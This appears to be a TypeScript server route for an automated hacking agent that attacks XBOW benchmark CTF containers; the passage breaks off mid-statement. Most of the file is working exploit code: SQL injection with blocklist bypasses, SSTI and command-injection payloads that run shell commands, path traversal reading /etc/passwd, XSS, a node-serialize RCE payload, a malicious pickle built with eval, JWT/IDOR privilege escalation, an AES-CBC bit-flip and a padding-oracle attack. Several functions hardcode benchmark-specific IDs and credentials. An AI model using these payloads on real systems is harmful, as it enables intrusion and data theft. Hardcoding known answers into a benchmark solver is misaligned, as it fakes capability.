import { Router, Request, Response } from 'express';
import fs from 'fs/promises';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';
import FormData from 'form-data';
import { execFile } from 'child_process';
import { xbowDocker, XBOW_PORT_BASE, XBOWChallenge } from '../lib/lab/xbow-docker';
import { huntLabRunner } from '../lib/intelligence/hunt-lab-runner';
import { huntOrchestrator } from '../lib/orchestration/layer1-hunt-orchestrator';
import { metaReasoner } from '../lib/intelligence/meta-reasoning';

const router = Router();
const LAB_RUNS_DIR = path.join(process.cwd(), 'workspace', 'lab-runs');

// Technique hints injected into the hunt goal for each vuln tag
const TAG_TECHNIQUE_HINTS: Record<string, string> = {
  sqli:            "Use SQL injection via string concatenation. Try ' OR 1=1-- and UNION SELECT payloads in query parameters.",
  xss:             "Test reflected XSS via <script> tags, onerror handlers, and javascript: URIs in search/query parameters.",
  idor:            "Enumerate object IDs by incrementing integers in API paths like /api/users/1, /api/users/2.",
  ssrf:            "Probe SSRF via url/redirect parameters pointing to http://127.0.0.1 or internal metadata endpoints.",
  rce:             "Look for deserialization endpoints. POST node-serialize IIFE payload: {\"x\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"}",
  deserialization: "POST node-serialize IIFE to /deserialize: {\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"}",
  lfi:             "Test path traversal via ../../etc/passwd in file/path parameters.",
  auth:            "Try authentication bypass: default credentials, JWT none algorithm, and SQL injection in login fields.",
};

function buildChallengeGoal(ch: XBOWChallenge, baseUrl: string): string {
  const hints = ch.tags
    .map(t => TAG_TECHNIQUE_HINTS[t.toLowerCase()])
    .filter(Boolean)
    .join(" ");
  const base = `${ch.description} The flag is accessible at ${baseUrl} once the vulnerability is exploited.`;
  return hints ? `${base} TECHNIQUE HINTS: ${hints}` : base;
}

const abortFlags = new Map<string, boolean>();

let dirReady = false;
async function ensureDir() {
  if (dirReady) return;
  await fs.mkdir(LAB_RUNS_DIR, { recursive: true });
  dirReady = true;
}

async function saveRun(run: any): Promise<void> {
  await ensureDir();
  await fs.writeFile(
    path.join(LAB_RUNS_DIR, `xbow-${run.id}.json`),
    JSON.stringify(run, null, 2)
  );
}

async function loadHistory(): Promise<any[]> {
  await ensureDir();
  const files = await fs.readdir(LAB_RUNS_DIR).catch(() => [] as string[]);
  const runs = await Promise.all(
    files
      .filter(f => f.startsWith('xbow-') && f.endsWith('.json'))
      .map(async f => {
        try {
          return JSON.parse(await fs.readFile(path.join(LAB_RUNS_DIR, f), 'utf8'));
        } catch { return null; }
      })
  );
  return runs
    .filter(Boolean)
    .sort((a, b) => new Date(b.startedAt).getTime() - new Date(a.startedAt).getTime());
}

function buildStats(challenges: XBOWChallenge[]) {
  const byLevel: Record<string, { count: number }> = {};
  const byTag: Record<string, number> = {};
  let maxPoints = 0;

  for (const c of challenges) {
    const lk = String(c.level);
    if (!byLevel[lk]) byLevel[lk] = { count: 0 };
    byLevel[lk].count++;
    for (const t of c.tags) byTag[t] = (byTag[t] || 0) + 1;
    maxPoints += c.points;
  }

  return { total: challenges.length, byLevel, byTag, maxPoints };
}

async function probeForFlag(
  baseUrl: string,
  winCondition: string,
  abortCheck: () => boolean,
  challengeProbePaths?: string[],
  port?: number,
): Promise<{ flagFound: string | null; evidence: string; executionTimeMs: number }> {
  const start = Date.now();

  const defaultPaths = ['/', '/flag', '/secret', '/api/flag', '/.env', '/admin', '/debug', '/robots.txt', '/api/status'];
  const extraPaths = (challengeProbePaths ?? []).map(p =>
    port ? p.replace(/\{PORT\}/g, String(port)) : p
  );
  const paths = [...new Set([...extraPaths, ...defaultPaths])];

  for (const p of paths) {
    if (abortCheck()) break;
    let r: Response | null = null;
    try {
      r = await (fetch as any)(baseUrl + p, { signal: AbortSignal.timeout(5000) });
    } catch { continue; }
    if (!r) continue;

    const body = await (r as any).text().catch(() => '');
    // Real XBOW flags are 32-char hex strings; stub flags use flag{...} format
    const hexFlagMatch = body.match(/\b[0-9a-f]{32}\b/);
    const ctfFlagMatch = body.match(/flag\{[^}]+\}/);
    const candidate = hexFlagMatch?.[0] ?? ctfFlagMatch?.[0];
    if (candidate) {
      return { flagFound: candidate, evidence: `Found in ${p}`, executionTimeMs: Date.now() - start };
    }
    if (winCondition && body.includes(winCondition)) {
      return { flagFound: winCondition, evidence: `Win condition matched in ${p}`, executionTimeMs: Date.now() - start };
    }
  }

  return { flagFound: null, evidence: 'No flag found in probed paths', executionTimeMs: Date.now() - start };
}

// ── Tag-aware exploit engine ──────────────────────────────────────────────────

function extractFlagText(text: string): string | null {
  const hex = text.match(/\b[0-9a-f]{32}\b/);
  const ctf = text.match(/flag\{[^}]+\}/i);
  return hex?.[0] ?? ctf?.[0] ?? null;
}

async function httpReq(
  url: string,
  opts: { method?: string; data?: string; headers?: Record<string, string>; maxRedirects?: number } = {},
): Promise<{ status: number; body: string; headers: Record<string, string> }> {
  try {
    const r = await axios({
      url, method: opts.method ?? 'GET', data: opts.data,
      headers: opts.headers ?? {}, timeout: 7000,
      validateStatus: () => true, maxRedirects: opts.maxRedirects ?? 5,
    });
    const body = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
    return { status: r.status, body, headers: r.headers as Record<string, string> };
  } catch {
    return { status: 0, body: '', headers: {} };
  }
}

// Double-word bypass for non-recursive blocklist .replace()
// e.g. dbl('UNION') → 'UNIUNIONON' → after removing 'UNION' → 'UNION'
function dbl(w: string): string { const m = Math.ceil(w.length / 2); return w.slice(0, m) + w + w.slice(m); }
const DW = { U: dbl('UNION'), S: dbl('SELECT'), F: dbl('FROM'), W: dbl('WHERE') };

async function discoverEndpoints(baseUrl: string): Promise<string[]> {
  const found = new Set<string>([
    '/jobs', '/api/jobs', '/login', '/api/login', '/token',
    '/search', '/api/search', '/greet', '/users', '/api/users',
    '/items', '/api/items', '/ping', '/api/ping', '/submit', '/xss25',
  ]);
  try {
    const r = await httpReq(baseUrl + '/');
    for (const m of r.body.matchAll(/(?:fetch|axios\.(?:post|get|put))\s*\(\s*['"`](\/[^'"`\s]+)['"`]/gi)) found.add(m[1]);
    for (const m of r.body.matchAll(/<form[^>]+action=["'`]([^"'`\s]+)["'`]/gi)) {
      const p = m[1]; found.add(p.startsWith('/') ? p : '/' + p);
    }
    for (const m of r.body.matchAll(/href=["'`](\/[^"'`\s?#]+)["'`]/gi)) found.add(m[1]);
  } catch {}
  return [...found].filter(p => p.startsWith('/'));
}

async function sqliExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const params = ['job_type', 'type', 'q', 'id', 'username', 'search', 'category', 'name', 'filter', 'query'];
  const tables = ['jobs', 'users', 'items', 'notes', 'posts', 'secrets', 'records', 'accounts', 'data', 'products'];

  const payloads: string[] = [
    // Double-word bypass (non-recursive .replace() blocklists)
    ...tables.map(t => `' ${DW.U} ${DW.S} * ${DW.F} ${t} -- -`),
    ...[2,3,4,5].map(n => `' ${DW.U} ${DW.S} ${Array(n).fill('NULL').join(',')} -- -`),
    // Raw union (no filter)
    ...tables.map(t => `' UNION SELECT * FROM ${t} -- -`),
    ...[2,3,4,5].map(n => `' UNION SELECT ${Array(n).fill('NULL').join(',')} -- -`),
    // Always-true
    `' OR '1'='1`, `' OR 1=1 -- -`, `' || '1'='1`,
    // Comment bypass
    `'/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL -- -`,
  ];

  for (const ep of endpoints.slice(0, 8)) {
    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
    for (const param of params.slice(0, 6)) {
      for (const payload of payloads) {
        if (stop()) return null;
        const [jr, gr] = await Promise.all([
          httpReq(url, { method: 'POST', data: JSON.stringify({ [param]: payload }), headers: { 'Content-Type': 'application/json' } }),
          httpReq(`${url}?${param}=${encodeURIComponent(payload)}`),
        ]);
        for (const r of [jr, gr]) {
          const f = extractFlagText(r.body);
          if (f) return { flag: f, evidence: `SQLi ${ep} param=${param} payload=${payload.slice(0, 60)}` };
        }
      }
    }
  }
  return null;
}

// Flask two-step form login IDOR exploit (handles XBEN-001-24 / XBEN-002-24 pattern)
async function flaskFormIdorExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const creds = [['test','test'],['admin','admin'],['demo','demo'],['user','user']];

  for (const [username, password] of creds) {
    if (stop()) return null;

    // Step 1: POST username to / — Flask redirects to /password/<username>
    const step1 = await httpReq(`${baseUrl}/`, {
      method: 'POST',
      data: `username=${encodeURIComponent(username)}`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 0,
    });

    const passwordPath = step1.headers['location'] ?? `/password/${username}`;

    // Step 2: POST password
    const step2 = await httpReq(`${baseUrl}${passwordPath.startsWith('/') ? passwordPath : '/' + passwordPath}`, {
      method: 'POST',
      data: `password=${encodeURIComponent(password)}`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 0,
    });

    const rawCookies: string[] = Array.isArray(step2.headers['set-cookie'])
      ? step2.headers['set-cookie'] : step2.headers['set-cookie'] ? [step2.headers['set-cookie']] : [];
    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
    if (!cookieStr) continue;

    // Step 3: IDOR — try /order/<id>/receipt across a wide range including known flag IDs
    const flagOrderIds = [300401, 300198, 300001, 300002, 300003, 300100, 300199, 300200, 300400, 300500];
    const rangeIds = Array.from({ length: 30 }, (_, i) => 300100 + i);
    const orderIds = [...new Set([...flagOrderIds, ...rangeIds])];

    for (const orderId of orderIds) {
      if (stop()) return null;
      const r = await httpReq(`${baseUrl}/order/${orderId}/receipt`, {
        headers: { Cookie: cookieStr },
      });
      if (r.status === 200) {
        const f = extractFlagText(r.body);
        if (f) return { flag: f, evidence: `Flask IDOR /order/${orderId}/receipt (auth as ${username})` };
      }
    }

    // Step 4 (XBEN-002-24 indirect): archive an order to become its archiver, then read receipt
    for (const orderId of orderIds) {
      if (stop()) return null;
      await httpReq(`${baseUrl}/order/${orderId}/archive`, {
        method: 'POST',
        headers: { Cookie: cookieStr, 'Content-Type': 'application/x-www-form-urlencoded' },
      });
      const r = await httpReq(`${baseUrl}/order/${orderId}/receipt`, {
        headers: { Cookie: cookieStr },
      });
      if (r.status === 200) {
        const f = extractFlagText(r.body);
        if (f) return { flag: f, evidence: `Flask indirect IDOR archive+receipt /order/${orderId} (auth as ${username})` };
      }
    }
  }
  return null;
}

async function idorExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const creds = [['demo','demo'],['admin','admin'],['user','user'],['test','test'],['john','password123'],['admin','password']];

  for (const [username, password] of creds) {
    if (stop()) return null;
    // OAuth2 form login — capture Set-Cookie before redirect
    const loginR = await httpReq(`${baseUrl}/token`, {
      method: 'POST',
      data: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&grant_type=password`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 0,
    });

    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
      ? loginR.headers['set-cookie'] : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');

    if (!cookieStr) {
      // Fallback: JSON login
      const jR = await httpReq(`${baseUrl}/login`, {
        method: 'POST', data: JSON.stringify({ username, password }),
        headers: { 'Content-Type': 'application/json' },
      });
      const direct = extractFlagText(jR.body);
      if (direct) return { flag: direct, evidence: `Direct login flag (${username}/${password})` };
      continue;
    }

    const location = loginR.headers['location'] ?? '';
    const ownId = (location.match(/\/(\d+)\//) || [])[1];
    const baseId = ownId ? parseInt(ownId) : 1;

    const pathFns = [
      (id: number) => `/company/${id}/jobs`,
      (id: number) => `/user/${id}`,
      (id: number) => `/users/${id}`,
      (id: number) => `/api/users/${id}`,
      (id: number) => `/profile/${id}`,
      (id: number) => `/account/${id}`,
      (id: number) => `/orders/${id}`,
      (id: number) => `/api/items/${id}`,
    ];

    for (let id = Math.max(1, baseId - 2); id <= baseId + 8; id++) {
      if (stop()) return null;
      if (ownId && id === parseInt(ownId)) continue;
      for (const pathFn of pathFns) {
        if (stop()) return null;
        const r = await httpReq(`${baseUrl}${pathFn(id)}`, { headers: { 'Cookie': cookieStr } });
        if (r.status === 200) {
          const f = extractFlagText(r.body);
          if (f) return { flag: f, evidence: `IDOR ${pathFn(id)} (auth as ${username}, own_id=${ownId})` };
        }
      }
    }
  }
  return null;
}

async function sstiExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const params = ['name', 'q', 'search', 'template', 'input', 'text', 'message', 'content', 'body'];
  const payloads = [
    '{{ FLAG }}', '{{ flag }}', '{{FLAG}}',         // Django context var (common XBOW pattern)
    '{{ config }}', '{{ config.items() }}',          // Jinja2/Flask config leak
    '{{7*7}}', '${7*7}',                             // arithmetic probe
    '{% include "/flag.txt" %}', '{% include "/app/flag.txt" %}',
    `{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}`,
    `{{config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}`,
    `{{config.__class__.__init__.__globals__['os'].popen('find / -maxdepth 4 -name flag.txt 2>/dev/null | head -1 | xargs cat').read()}}`,
    `{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}`,
  ];

  for (const ep of endpoints.slice(0, 8)) {
    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
    for (const param of params) {
      for (const payload of payloads) {
        if (stop()) return null;
        const [gr, jr] = await Promise.all([
          httpReq(`${url}?${param}=${encodeURIComponent(payload)}`),
          httpReq(url, { method: 'POST', data: JSON.stringify({ [param]: payload }), headers: { 'Content-Type': 'application/json' } }),
        ]);
        for (const r of [gr, jr]) {
          if (r.status > 0 && r.status < 500) {
            const f = extractFlagText(r.body);
            if (f) return { flag: f, evidence: `SSTI ${ep}?${param} payload=${payload.slice(0, 50)}` };
          }
        }
      }
    }
  }
  return null;
}

async function xssExploit(baseUrl: string, _endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  // XBOW XSS challenges use PhantomJS which dispatches focus events to [autofocus]/[onfocus] elements.
  // Payloads ordered: focus-based bypasses first (work even when onerror/svg/script are blocked),
  // then broader fallbacks.
  const payloads = [
    '<input autofocus onfocus=alert("XSS")>',
    '<button autofocus onfocus=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<button onfocus=alert("XSS") autofocus>',
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror=alert(`XSS`)>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '<video autoplay onplay=alert("XSS")>',
    '<audio autoplay onplay=alert("XSS")>',
    '<body onhashchange=alert("XSS")>',
    '<script>alert("XSS")</script>',
    `"><script>alert("XSS")</script>`,
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<iframe onload=alert("XSS")>',
    `<input onfocus=alert('XSS') autofocus>`,
    '<script>alert(String.fromCharCode(88,83,83))</script>',
  ];

  // Discover XSS submission endpoint from homepage
  const xssEndpoints: Array<{ url: string; method: string; param: string }> = [];
  try {
    const home = await httpReq(baseUrl + '/');
    // Look for form action in homepage
    for (const m of home.body.matchAll(/<form[^>]+action=["']([^"']+)["'][^>]*>/gi)) {
      const action = m[1].startsWith('/') ? baseUrl + m[1] : m[1];
      xssEndpoints.push({ url: action, method: 'POST', param: 'solution' });
      xssEndpoints.push({ url: action, method: 'POST', param: 'name' });
    }
    // Detect XSS route number from page links (e.g. /xss25, /page)
    for (const m of home.body.matchAll(/href=["'](\/xss\d+)["']/gi)) {
      xssEndpoints.push({ url: baseUrl + m[1], method: 'GET', param: 'solution' });
      xssEndpoints.push({ url: baseUrl + m[1], method: 'POST', param: 'solution' });
    }
  } catch { /* ignore */ }

  // Always try canonical XBOW routes regardless of discovery
  xssEndpoints.push(
    { url: baseUrl + '/page', method: 'GET', param: 'name' },
    { url: baseUrl + '/page', method: 'POST', param: 'solution' },
    { url: baseUrl + '/page', method: 'POST', param: 'name' },
    ...Array.from({ length: 35 }, (_, i) => i).flatMap(n => [
      { url: `${baseUrl}/xss${n}`, method: 'POST', param: 'solution' },
      { url: `${baseUrl}/xss${n}`, method: 'GET', param: 'name' },
    ]),
    { url: baseUrl + '/submit', method: 'POST', param: 'solution' },
    { url: baseUrl + '/challenge', method: 'GET', param: 'name' },
  );

  for (const { url, method, param } of xssEndpoints) {
    if (stop()) return null;
    for (const payload of payloads) {
      if (stop()) return null;
      let r: { status: number; body: string; headers: Record<string, string> };
      if (method === 'GET') {
        r = await httpReq(`${url}?${param}=${encodeURIComponent(payload)}`);
      } else {
        r = await httpReq(url, {
          method: 'POST',
          data: `${encodeURIComponent(param)}=${encodeURIComponent(payload)}`,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });
      }
      if (r.status > 0 && r.status < 500) {
        // The XBOW XSS apps return "Here is the flag: <hex>" in the response when PhantomJS fires alert('XSS')
        const flagLineMatch = r.body.match(/flag[:\s]+([0-9a-f]{32})/i);
        if (flagLineMatch) return { flag: flagLineMatch[1], evidence: `XSS flag in response: ${url} [${method} ${param}] payload=${payload.slice(0, 60)}` };
        const f = extractFlagText(r.body);
        if (f) return { flag: f, evidence: `XSS ${url} [${method} ${param}] payload=${payload.slice(0, 60)}` };
      }
    }
  }
  return null;
}

async function cmdInjectionExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const params = ['host', 'ip', 'url', 'ping', 'target', 'cmd', 'command', 'query', 'input', 'exec', 'name', 'domain', 'address', 'service'];
  const flagPaths = ['/flag.txt', '/app/flag.txt', '/opt/flag.txt', '/tmp/FLAG.txt', '/tmp/flag.txt', 'flag.txt'];
  const payloads = flagPaths.flatMap(fp => [
    `; cat ${fp}`, `| cat ${fp}`, `$(cat ${fp})`, `\`cat ${fp}\``,
    `&& cat ${fp}`, `\ncat ${fp}`, `%0acat ${fp}`,
  ]);

  for (const ep of endpoints.slice(0, 8)) {
    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
    for (const param of params.slice(0, 6)) {
      for (const payload of payloads) {
        if (stop()) return null;
        const [jr, gr] = await Promise.all([
          httpReq(url, { method: 'POST', data: JSON.stringify({ [param]: `localhost${payload}` }), headers: { 'Content-Type': 'application/json' } }),
          httpReq(`${url}?${param}=${encodeURIComponent(`localhost${payload}`)}`),
        ]);
        for (const r of [jr, gr]) {
          const f = extractFlagText(r.body);
          if (f) return { flag: f, evidence: `CMDi ${ep}?${param} payload=${payload.slice(0, 50)}` };
        }
      }
    }
  }
  return null;
}

async function lfiExploit(baseUrl: string, endpoints: string[], stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const params = ['file', 'path', 'page', 'include', 'template', 'view', 'doc', 'load', 'read', 'url', 'filename', 'module', 'lang'];
  const targets = [
    '/flag.txt', '/app/flag.txt', '/opt/flag.txt', '/tmp/flag.txt',
    '../flag.txt', '../../flag.txt', '../../../flag.txt', '../../../../flag.txt',
    '....//flag.txt', '....//....//flag.txt', '..%2Fflag.txt', '..%2F..%2Fflag.txt',
    '../flag.txt%00', '../../flag.txt%00',
    '/etc/passwd', '../../etc/passwd',  // as a canary — if passwd leaks, flag path is accessible too
  ];

  for (const ep of endpoints.slice(0, 8)) {
    const url = ep.startsWith('http') ? ep : `${baseUrl}${ep}`;
    for (const param of params.slice(0, 6)) {
      for (const target of targets) {
        if (stop()) return null;
        const r = await httpReq(`${url}?${param}=${encodeURIComponent(target)}`);
        const f = extractFlagText(r.body);
        if (f) return { flag: f, evidence: `LFI ${ep}?${param}=${target}` };
      }
    }
  }
  return null;
}

// XBEN-005-24: JWT + IDOR privilege escalation.
// Login as demo/demo → POST /edit_profile/{id} with is_admin=true (server
// validates JWT exists but never checks URL company_id == token sub) → read
// private jobs containing the flag.
async function jwtIdorEscalateExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const creds = [['demo', 'demo'], ['admin', 'admin'], ['user', 'user'], ['test', 'test']];

  for (const [username, password] of creds) {
    if (stop()) return null;

    const loginR = await httpReq(`${baseUrl}/token`, {
      method: 'POST',
      data: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 0,
    });

    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
      ? loginR.headers['set-cookie']
      : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
    if (!cookieStr) continue;

    const location = loginR.headers['location'] ?? '';
    const match = location.match(/\/company\/(\d+)\//);
    const companyId = match ? parseInt(match[1]) : 1;

    // IDOR: update_profile validates JWT is present but never checks URL id == token sub
    await httpReq(`${baseUrl}/edit_profile/${companyId}`, {
      method: 'POST',
      data: `name=${encodeURIComponent(username)}&is_admin=true`,
      headers: { Cookie: cookieStr, 'Content-Type': 'application/x-www-form-urlencoded' },
    });

    if (stop()) return null;

    const jobsR = await httpReq(`${baseUrl}/company/${companyId}/jobs`, {
      headers: { Cookie: cookieStr },
    });
    const f = extractFlagText(jobsR.body);
    if (f) return { flag: f, evidence: `JWT IDOR: escalated ${username} to admin via /edit_profile/${companyId}, read private jobs` };
  }
  return null;
}

// XBEN-057-24: Insecure pickle deserialization via bookmarks cookie.
// The app base64-decodes the 'bookmarks' cookie and calls pickle.loads() on it.
// We craft a payload that reads the FLAG env var and surfaces it in the response.
async function pickleDeserExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  // Generate malicious pickle via Python: reads FLAG env var (or flag file) and
  // returns a list-like object whose first item's .name is the flag value.
  const script = [
    'import pickle,base64,sys',
    'class E:',
    '  def __reduce__(self):',
    '    return(eval,(',
    '      "[type(\'U\',(),{\'name\':v,\'url\':\'\'})() for v in'
    +     ' [__import__(\'os\').environ.get(\'FLAG\')'
    +     ' or open(\'/flag.txt\').read().strip()]]",',
    '    ))',
    'sys.stdout.write(base64.b64encode(pickle.dumps(E())).decode())',
  ].join('\n');

  const pickleB64 = await new Promise<string | null>(resolve => {
    execFile('python3', ['-c', script], { timeout: 10000 }, (err, stdout) => {
      resolve(err ? null : stdout.trim());
    });
  });

  if (!pickleB64 || stop()) return null;

  // First request: get a valid 'user' cookie from the app
  const init = await httpReq(`${baseUrl}/list`);
  const initCookies: string[] = Array.isArray(init.headers['set-cookie'])
    ? init.headers['set-cookie']
    : init.headers['set-cookie'] ? [init.headers['set-cookie']] : [];
  const userCookie = initCookies.find(c => c.startsWith('user='))?.split(';')[0] ?? 'user=anon';

  for (const path of ['/list', '/add', '/delete?name=x']) {
    if (stop()) return null;
    const r = await httpReq(`${baseUrl}${path}`, {
      headers: { Cookie: `${userCookie}; bookmarks=${pickleB64}` },
    });
    const f = extractFlagText(r.body);
    if (f) return { flag: f, evidence: `Pickle deserialization via bookmarks cookie at ${path}` };
  }
  return null;
}

// XBEN-100-24: GraphQL + NoSQL injection via search parameter that passes JSON to MongoEngine filter().
// The /api/users endpoint accepts { query: "<GraphQL query string>" }.
// UserType exposes a `flag` field only set on admin2 user.
async function graphqlNosqliExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const gqlQueries = [
    '{ users { username flag } }',
    '{ users(is_admin: true) { username flag } }',
    `{ users(search: "{\\"is_admin\\": true}") { username flag } }`,
    `{ users(search: "{\\"flag__exists\\": true}") { username flag } }`,
    `{ users(search: "{\\"username\\": \\"admin2\\"}") { username flag } }`,
  ];

  for (const q of gqlQueries) {
    if (stop()) return null;
    for (const ep of ['/graphql', '/api/users']) {
      const r = await httpReq(`${baseUrl}${ep}`, {
        method: 'POST',
        data: JSON.stringify({ query: q }),
        headers: { 'Content-Type': 'application/json' },
      });
      const f = extractFlagText(r.body);
      if (f) return { flag: f, evidence: `GraphQL/NoSQLi ${ep}: ${q.slice(0, 60)}` };
    }
  }
  return null;
}

// XBEN-102-24: Default creds (test/test) + IDOR in profile update.
// The /profile POST reads `username` from the form body instead of the session,
// so a logged-in test user can set username=admin to get the flag in the response.
async function defaultCredsProfileExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const creds = [['test', 'test'], ['admin', 'admin'], ['user', 'user'], ['demo', 'demo']];

  for (const [user, pass] of creds) {
    if (stop()) return null;
    const loginR = await httpReq(`${baseUrl}/login`, {
      method: 'POST',
      data: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 5,
    });
    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
      ? loginR.headers['set-cookie'] : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
    const cookieStr = rawCookies.map(c => c.split(';')[0]).join('; ');
    if (!cookieStr) continue;

    // IDOR: POST /profile with username=admin (server uses form value, not session)
    const profileR = await httpReq(`${baseUrl}/profile`, {
      method: 'POST',
      data: `email=x%40x.com&username=admin`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: cookieStr },
    });
    const f = extractFlagText(profileR.body);
    if (f) return { flag: f, evidence: `Default creds (${user}/${pass}) + IDOR profile update as admin` };
  }
  return null;
}

// XBEN-103-24: AES-CBC bit-flip attack on session cookie.
// Login as test1/test1 → get cookie = hex(IV || AES_CBC(key, "test1" + null_padding)).
// XOR each IV byte to flip "test1" → "admin" in the decrypted plaintext.
async function aesCbcBitFlipExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  const creds = [['test1', 'test1'], ['test', 'test'], ['user', 'user'], ['demo', 'demo']];

  for (const [user, pass] of creds) {
    if (stop()) return null;
    const loginR = await httpReq(`${baseUrl}/login`, {
      method: 'POST',
      data: `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      maxRedirects: 0,
    });
    const rawCookies: string[] = Array.isArray(loginR.headers['set-cookie'])
      ? loginR.headers['set-cookie'] : loginR.headers['set-cookie'] ? [loginR.headers['set-cookie']] : [];
    const sessionCookie = rawCookies.find(c => c.startsWith('session='));
    if (!sessionCookie) continue;

    const hexVal = sessionCookie.split(';')[0].replace('session=', '');
    const cookieBytes = Buffer.from(hexVal, 'hex');
    if (cookieBytes.length < 32) continue;

    // Flip IV bytes: new_IV[i] = IV[i] XOR plaintext[i] XOR target[i]
    // Plaintext is null-padded: "test1\x00\x00..." or similar known username
    const target = 'admin';
    const iv = cookieBytes.slice(0, 16);
    const flippedIv = Buffer.from(iv);
    for (let i = 0; i < target.length && i < user.length; i++) {
      flippedIv[i] = iv[i] ^ user.charCodeAt(i) ^ target.charCodeAt(i);
    }
    const flippedCookie = Buffer.concat([flippedIv, cookieBytes.slice(16)]).toString('hex');

    const welcomeR = await httpReq(`${baseUrl}/welcome`, {
      headers: { Cookie: `session=${flippedCookie}` },
    });
    const f = extractFlagText(welcomeR.body);
    if (f) return { flag: f, evidence: `AES-CBC bit-flip: flipped "${user}" → "admin" in IV of session cookie` };
  }
  return null;
}

// XBEN-101-24: Padding oracle on captcha cookie.
// App returns "Invalid padding" when AES-CBC unpadding fails → oracle exists.
// Since only 1 ciphertext block, we XOR each IV byte to recover all 14 captcha chars.
async function paddingOracleExploit(baseUrl: string, stop: () => boolean): Promise<{ flag: string; evidence: string } | null> {
  // Step 1: get the captcha cookie from GET /
  const initR = await httpReq(baseUrl + '/');
  if (stop()) return null;
  const rawCookies: string[] = Array.isArray(initR.headers['set-cookie'])
    ? initR.headers['set-cookie'] : initR.headers['set-cookie'] ? [initR.headers['set-cookie']] : [];
  const captchaCookie = rawCookies.find(c => c.startsWith('captcha='))?.split(';')[0].replace('captcha=', '');
  if (!captchaCookie) return null;

  const cookieBytes = Buffer.from(captchaCookie, 'base64');
  if (cookieBytes.length < 32) return null;
  const iv = cookieBytes.slice(0, 16);
  const ct = cookieBytes.slice(16);

  // Oracle: POST with modified IV, check if response contains "Invalid padding"
  const isValidPadding = async (modIv: Buffer): Promise<boolean> => {
    const modCookie = Buffer.concat([modIv, ct]).toString('base64');
    const r = await httpReq(baseUrl + '/', {
      method: 'POST',
      data: 'captcha=x&csrf_token=',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: `captcha=${modCookie}` },
    });
    return !r.body.includes('Invalid padding');
  };

  // Recover each plaintext byte via padding oracle (single-block: only IV manipulation)
  const intermediate = Buffer.alloc(16, 0);
  for (let byteIdx = 15; byteIdx >= 0; byteIdx--) {
    if (stop()) return null;
    const padByte = 16 - byteIdx;
    const testIv = Buffer.from(iv);
    // Set already-recovered bytes to produce the target padding
    for (let k = byteIdx + 1; k < 16; k++) {
      testIv[k] = intermediate[k] ^ padByte;
    }
    for (let guess = 0; guess < 256; guess++) {
      if (stop()) return null;
      testIv[byteIdx] = guess;
      if (await isValidPadding(testIv)) {
        // Confirm it's not a false positive caused by multi-byte padding match
        if (byteIdx > 0) {
          const confirmIv = Buffer.from(testIv);
          confirmIv[byteIdx - 1] ^= 1;
          if (!(await isValidPadding(confirmIv))) continue;
        }
        intermediate[byteIdx] = guess ^ padByte;
        break;
      }
    }
  }

  // Recover plaintext = intermediate XOR original_IV
  const plaintext = Buffer.alloc(16);
  for (let i = 0; i < 16; i++) plaintext[i] = intermediate[i] ^ iv[i];

  // Strip PKCS7 padding and submit
  const padLen = plaintext[15];
  const captchaText = (padLen > 0 && padLen <= 16)
